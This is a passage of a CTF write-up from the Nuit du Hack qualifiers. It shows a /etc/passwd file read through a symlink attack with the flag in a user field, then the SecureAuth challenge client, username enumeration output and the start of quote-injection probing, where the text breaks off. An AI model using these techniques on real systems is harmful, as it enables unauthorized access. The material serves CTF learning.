&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;
&lt;span class="n"&gt;daemon&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;daemon&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="sr"&gt;/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="sr"&gt;/sh sync:x:4:65534:sync:/bin:/bin/s&lt;/span&gt;&lt;span class="n"&gt;ync&lt;/span&gt;
&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="sr"&gt;/games:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/cache/man:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;lp&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;lp&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/lpd:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/mail:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;news&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;news&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/news:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;uucp&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;uucp&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/spool/uucp:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;proxy&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;proxy&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;
&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/www:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/backups:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Mailing&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;
&lt;span class="n"&gt;Manager&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/list:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;irc&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ircd&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/run/ircd:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;gnats&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Gnats&lt;/span&gt;
&lt;span class="n"&gt;Bug&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Reporting&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="o"&gt;):/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/lib/gnats:/bin/s&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;nobody&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;nobody&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;nonexistent&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;
&lt;span class="n"&gt;libuuid&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="o"&gt;::/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/lib/libuuid:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;span class="n"&gt;sshd&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;101&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65534&lt;/span&gt;&lt;span class="o"&gt;::/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="sr"&gt;/run/sshd:/usr/sbin/&lt;/span&gt;&lt;span class="n"&gt;nologin&lt;/span&gt;
&lt;span class="n"&gt;facesec&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;W00tSymL1nkAttackStillW0rksIn2k15&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/facesec:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The flag is the content of the &lt;code&gt;User ID Info&lt;/code&gt; of the facesec user.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: W00tSymL1nkAttackStillW0rksIn2k15&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;SecureAuth&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_Spl3en"&gt;Spl3en&lt;/a&gt; who redacte this writeup before me.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Exploit | 350 points | http://quals.nuitduhack.com/challenges/view/16&lt;/p&gt;
&lt;h2&gt;Statement&lt;/h2&gt;
&lt;p&gt;*"There is a building. Inside this building there is a level where no elevator
can go, and no stair can reach. This level is filled with doors. These doors
lead to many places. Hidden places. But one door is special. One door leads to
the source." (The Keymaker)&lt;/p&gt;
&lt;p&gt;Find the key. Open the door.
Static client @ http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz*&lt;/p&gt;
&lt;h2&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The tar.gz file contain the following python program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SecureConnect_Client&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;151.80.18.93&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4241&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;
        &lt;span class="n"&gt;challenge&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_challenge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;authpacket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;process_authpacket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[~] Sending auth packet...&amp;quot;&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authpacket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_challenge&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CHALLENGE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[~] Server sent challenge : &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; !&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Bad challenge...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_authpacket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Auth data : &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;scc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SecureConnect_Client&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;scc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We execute the code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : gOg0gySNyDbKCKD5oT6SLEdG4fEgkNXntk5uQ1m1XtZzIvMT62bcqMgmB6ei5HVI !
[+] Auth data : AUTH username|7b98c028fc42ee7bc830948b036571f8327279b6929b4f598891ed608edbfbd9
[~] Sending auth packet...
[!] Authentification Error : Invalid username.
[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;admin&lt;/h3&gt;
&lt;p&gt;By replacing &lt;code&gt;username&lt;/code&gt; by &lt;code&gt;admin&lt;/code&gt; we got a different message allowing us to
think that we got the right user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : GRlJD0cTH7RQFPQ5TUNQRQZVmLrxejFNsDPYFF0LWZKvBJLvFwAvN0YDPvU9AMGV !
[+] Auth data : AUTH admin|febb7f8cec097ba5636da95ded1b019030483436385584297bbf64e1bf828acb
[~] Sending auth packet...
[+] Welcome Administrator we are verifying your password...
[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Errors&lt;/h3&gt;
&lt;p&gt;Moreover, when playing with the username value, for instance by putting
&lt;code&gt;username"&lt;/code&gt; we got the following message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
